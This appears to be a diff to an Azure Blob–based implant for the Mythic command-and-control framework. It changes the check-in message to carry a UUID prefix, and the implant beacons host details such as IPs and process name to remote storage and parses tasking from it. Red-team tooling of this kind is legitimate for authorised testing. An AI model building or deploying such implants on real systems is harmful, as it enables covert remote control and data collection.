@@ -82,9 +82,9 @@ class AzureBlobAgent:
             print(f"[!] GET blob error: {e}")
             return b""
 
-    def get_checkin_data(self) -> dict:
+    def get_checkin_data(self) -> str:
         """Build checkin message for Mythic"""
-        return {
+        return self.uuid + json.dumps({
             "action": "checkin",
             "uuid": self.uuid,
             "ips": self._get_ips(),
@@ -97,7 +97,7 @@ class AzureBlobAgent:
             "integrity_level": 2,
             "external_ip": "",
             "process_name": sys.executable,
-        }
+        })
 
     def _get_ips(self) -> list:
         """Get local IP addresses"""
@@ -113,7 +113,7 @@ class AzureBlobAgent:
         """Perform initial checkin"""
         print(f"[*] Checking in as {self.uuid}")
         checkin_data = self.get_checkin_data()
-        encoded = base64.b64encode(json.dumps(checkin_data).encode()).decode()
+        encoded = base64.b64encode(checkin_data.encode()).decode()
 
         # Write checkin blob
         if self.put_blob("checkin.blob", encoded.encode()):
@@ -132,7 +132,7 @@ class AzureBlobAgent:
 
         try:
             decoded = base64.b64decode(data).decode()
-            tasking = json.loads(decoded)
+            tasking = json.loads(decoded[36:])  # Skip UUID prefix
             return tasking.get("tasks", [])
         except Exception as e:
             print(f"[!] Failed to parse tasking: {e}")
